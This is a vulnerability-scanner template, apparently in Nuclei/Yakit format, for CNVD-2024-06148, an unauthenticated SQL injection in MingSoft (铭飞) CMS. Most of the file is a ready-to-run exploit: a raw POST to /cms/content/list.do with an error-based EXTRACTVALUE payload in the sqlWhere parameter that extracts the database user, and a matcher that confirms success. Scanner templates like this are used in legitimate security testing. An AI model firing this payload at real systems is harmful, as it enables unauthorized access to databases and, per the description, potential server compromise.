content:
id: CNVD-2024-06148

info:
  name: 铭飞CMS-list.do-SQL注入漏洞
  author: Deans
  severity: high
  description: 由于铭飞CMS 文章列表接口content/list.do中的sqlWhere参数缺少对外部输入SQL语句的验证，未经身份验证的攻击者可利用该漏洞获取数据库敏感数据，进一步利用可获取服务器权限。
  reference:
  - https://github.com/
  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: 95b8546ca065acbc2ea8aff81ece1588

http:
- raw:
  - |-
    @timeout: 30s
    POST /cms/content/list.do HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Accept-Encoding: gzip, deflate, br

    sqlWhere=[{"action"%3a"","field"%3a"1+AND+EXTRACTVALUE(4095,CONCAT(0x7e,(select user()),0x7e))","el":"eq","model":"contentTitle","name":"123","type":"input","value":"a"}]

  max-redirects: 3
  disable-cookie: true
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - ~@localhost~
    condition: and
